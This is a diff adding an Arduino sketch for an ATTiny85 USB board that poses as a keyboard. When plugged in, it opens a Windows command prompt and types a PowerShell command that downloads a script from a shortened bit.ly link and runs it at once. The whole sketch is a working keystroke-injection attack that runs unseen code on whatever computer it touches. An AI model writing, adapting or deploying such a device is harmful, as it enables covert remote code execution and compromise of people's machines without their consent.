@@ -1,0 +1,35 @@
+//ATTiny85
+
+#include "DigiKeyboard.h"
+
+void setup() {
+  // put your setup code here, to run once:
+
+  DigiKeyboard.sendKeyStroke(0);
+
+  DigiKeyboard.delay(5000);
+
+  DigiKeyboard.sendKeyStroke(0, MOD_GUI_LEFT);
+
+  DigiKeyboard.delay(1000);
+
+  DigiKeyboard.print("cmd");
+
+  DigiKeyboard.delay(1000);
+
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+
+  DigiKeyboard.delay(1000);
+  
+  DigiKeyboard.print("cmd.exe /c powershell iex (New-Object Net.WebClient).DownloadString('http://bit.ly/e0Mw9w')");
+
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+  
+
+
+}
+
+void loop() {
+  // put your main code here, to run repeatedly:
+
+}
